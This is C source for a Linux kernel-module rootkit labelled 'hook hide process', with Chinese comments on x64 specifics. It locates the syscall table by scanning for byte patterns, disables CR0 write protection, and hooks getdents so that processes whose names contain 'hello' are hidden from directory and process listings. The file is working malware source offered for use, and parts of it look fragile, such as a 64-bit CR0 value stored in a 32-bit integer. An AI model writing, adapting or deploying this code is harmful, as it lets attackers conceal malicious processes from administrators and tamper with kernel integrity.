#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <asm/unistd.h>
#include <linux/dirent.h>
#include <linux/stat.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#define CALLOFF 100


char psname[10] = "hello";
char *processname = psname;

struct{
    unsigned short limit;
    unsigned int base;
}__attribute__((packed))idtr;

struct{
    unsigned short off_low;
    unsigned short sel;
    unsigned char none;
    unsigned char flags;
    unsigned short off_high;
}__attribute__((packed))*idt;

struct _idt
{
    unsigned short offset_low,segment_sel;
    unsigned char reserved,flags;
    unsigned short offset_high;
};


//define function, Point to the system being hijacked

struct linux_dirent
{
    unsigned long     d_ino;
    unsigned long     d_off;
    unsigned short    d_reclen;
    char    d_name[1];
};

asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);

unsigned long *sys_call_table = NULL;

//find sys_call_table

char* findoffset(char *start)
{
    //printk(KERN_ALERT "start findoffset...\n");
    char *p = NULL;
    int i = 0;

    p = start;
    for(i=0;i<(100-2);i++,p++)
    {
        if(*(p+0) == '\xff' && *(p+1) == '\x14' && *(p+2) == '\xc5')
		{
	    	//printk(KERN_ALERT "p: 0x%x\n",p);
	    	return p;
		}
    }
    return NULL;
}

//clear and return cr0

unsigned int clear_and_return_cr0(void)
{
    //printk(KERN_INFO "start clear_and_return_cr0...\n");
    unsigned int cr0 = 0;
    unsigned int ret = 0;
    
    asm volatile ("movq %%cr0, %%rax":"=a"(cr0));
    
    ret = cr0;
    
    cr0 &= 0xfffffffffffeffff;
    
    asm volatile ("movq %%rax, %%cr0"
                :
                :"a"(cr0)
		);

    return ret;
}

//ser cr0

void setback_cr0(unsigned int val)
{
    //printk(KERN_INFO "start setback_cr0...\n");
    
    asm volatile ("movq %%rax, %%cr0"
                :
		:"a"(val)
		);
}

//char* to int

int myatoi(char *str)
{
    int res = 0;
    int mul = 1;
    char *ptr = NULL;
	if (str == NULL) {
		return 0;	
	}
    for (ptr = str + strlen(str) - 1; ptr >= str; ptr--)
    {
        if (*ptr < '0' || *ptr > '9')
		{
	    	return 0;
		}	
		res += (*ptr - '0') * mul;
		mul *= 10;
    }
    if(res>0 && res< 99999)
    {
        //printk(KERN_INFO "pid = %d\n",res);
    	return res;
    }
	return 0;
}

struct task_struct *get_task(pid_t pid)
{
    struct task_struct *p = get_current(),*entry = NULL;
    list_for_each_entry(entry,&(p->tasks),tasks)
    {
        if(entry->pid == pid)
		{
	   		return entry;
		}
    }
    return NULL;
}

static inline char *get_name(struct task_struct *p, char *buf)
{
    int i = 0;
    char *name = NULL;
    name = p->comm;
    i = sizeof(p->comm);
    do {
        unsigned char c = *name;
		name++;
		i--;
		*buf = c;
		if(!c)
		{
	    	break;
		}
		if('\\' == c)
		{
	    	buf[1] = c;
	    	buf += 2;
	    	continue;
		}
		if('\n' == c)
		{
	    	buf[0] = '\\';
	   		buf[1] = 'n';
	    	buf += 2;
	    	continue;
		}
		buf++;
    } while(i);

    *buf = '\n';
    return buf + 1;
}

int get_process(pid_t pid)
{
	if (pid == 0) {
		return 0;	
	}
    struct task_struct *task = get_task(pid);
    char buffer[64] = {0};
    if(task)
    {
        get_name(task, buffer);
		if(strstr(buffer, processname))
		{
			//printk(KERN_INFO "task name = %s\n", buffer);
	    	return 1;
		}
	    return 0;
    }
    return 0;
}

//the hacked sys_getdents64

asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{

    long value = 0;
    unsigned short len = 0;
    unsigned short tlen = 0;

    //printk(KERN_INFO  "start call orig_getdents...\n");
    
    value = (*orig_getdents) (fd, dirp, count);
    
    //printk(KERN_INFO "end call orig_getdents...\n");

    tlen = value;
    //list dir table
    while(0 < tlen)
    {
        len = dirp->d_reclen;
		tlen = tlen - len;
		//printk(KERN_INFO "d_name = %s\n", dirp->d_name);

		if(get_process(myatoi(dirp->d_name)))
		{
	    	//printk(KERN_EMERG "find process...\n");
	    	memmove(dirp, (char *) dirp + dirp->d_reclen, tlen);
	    	value = value - len;
	    	//printk(KERN_INFO  "hide successful...\n");
		}
		if(tlen)
		{
	    	dirp = (struct linux_dirent *) ((char *)dirp + dirp->d_reclen);
		}
    }

    //printk(KERN_INFO "finished hacked_getdents...\n");
    return value;
}

static void *memmem(const void *haystack, size_t haystack_len, const void *needle, size_t needle_len)
{
    const char *begin = NULL;
    const char *const last_possible = (const char *) haystack + haystack_len - needle_len;
    if (needle_len == 0)
    {
        //printk(KERN_ALERT "needle_len == 0\n");
		return (void*)haystack;
    }

    if (__builtin_expect(haystack_len < needle_len, 0))
    {
        return NULL;
    }

    for (begin = (const char *) haystack; begin <= last_possible; ++begin)
    {
        if (begin[0] == ((const char *) needle)[0]
	        && !memcmp((const void *) &begin[1],
		        (const void *) ((const char *) needle + 1),
			    needle_len - 1))
		{
	    	return (void*) begin;
	}		
    }
    return NULL;
}

//获取系统调用表
/*
32位系统与64为系统不同
和x86相比,x64的系统调用劫持有以下变化：

1、	搜索的字符串不同:x64需要搜索的字符串是"\xff\x14\xc5";
而32位系统使用 \xff\x14\x85

2、cr0寄存器是64位的,在打开、关闭页面读写权限时,要使用64位的掩码,高32为全是f

3、在获得sys_call_table地址时需要和0xffffffff00000000相或。否则可能宕机。
*/
static unsigned long get_sct_addr(void)
{
    #define OFFSET_SYSCALL 200

    unsigned long syscall_long, retval;
    char sc_asm[OFFSET_SYSCALL] = {0};

    rdmsrl(MSR_LSTAR, syscall_long);
    memcpy(sc_asm, (char *)syscall_long, OFFSET_SYSCALL);
    
    retval = (unsigned long) memmem(sc_asm, OFFSET_SYSCALL, "\xff\x14\xc5", 3);

    if ( retval != 0 )
    {
        retval = (unsigned long) ( * (unsigned long *)(retval+3) );
    }
    else
    {
        //printk(KERN_INFO "long mode : memmem found nothing, returning NULL");
		retval = 0; 
    }
    #undef OFFSET_SYSCALL
    return retval;
}

static int __init hook_init(void)
{
    //printk(KERN_ALERT "start hook_init\n");
    
    unsigned long orig_cr0 = 0;//clear_and_return_cr0();

    sys_call_table = (unsigned long*)get_sct_addr();
    sys_call_table = (unsigned long)sys_call_table | 0xffffffff00000000;

    if(!sys_call_table)
    {
        //printk(KERN_ALERT "=== get_sct_addr fail ===\n");
        return -EFAULT;
    }//CENTOS 下 PS命令使用的是 __NR_getdents，而不是 __NR_getdents64
    else if(sys_call_table[__NR_getdents] != hacked_getdents)
    {
        //printk(KERN_ALERT "start __NR_getdents64 ...\n");
        ////printk(KERN_ALERT "sct:0x%x\n", (unsigned long)sys_call_table);
		//printk(KERN_ALERT "sct:0x%x,hacked_getdents:0x%x\n", (unsigned long)sys_call_table[__NR_getdents],(unsigned long)hacked_getdents);
        
        orig_cr0 = clear_and_return_cr0();
        orig_getdents = sys_call_table[__NR_getdents];
		//printk(KERN_ALERT "old:0x%x, new:0x%x\n",(unsigned long) orig_getdents, (unsigned long)hacked_getdents);
		//printk(KERN_ALERT "end __NR_getdents64 ...\n");
        
        if(hacked_getdents != NULL)
        {
	    	//printk(KERN_ALERT "call hacked_getdents...\n");

            sys_call_table[__NR_getdents] = hacked_getdents;
        }
        
		setback_cr0(orig_cr0);
	
		//printk(KERN_INFO "hideps: module loaded.\n");
        return 0;
    }
    else
    {
        //printk(KERN_DEBUG "system_call_table_long[__NR_getdents64] == hacked_getdents\n");
        return -EFAULT;
    }
}

static int __exit unhook_exit(void)
{
    //printk(KERN_ALERT "start unhook_exit\n");
    
    unsigned long orig_cr0 = clear_and_return_cr0();
    if(sys_call_table) {
        sys_call_table[__NR_getdents] = orig_getdents;
	}

    setback_cr0(orig_cr0);
    return 0;
}

MODULE_AUTHOR("zhao liang. Halcrow <mhalcrow@us.ibm.com>");
MODULE_DESCRIPTION("hook hide process");
MODULE_LICENSE("GPL");

module_init(hook_init)
module_exit(unhook_exit)
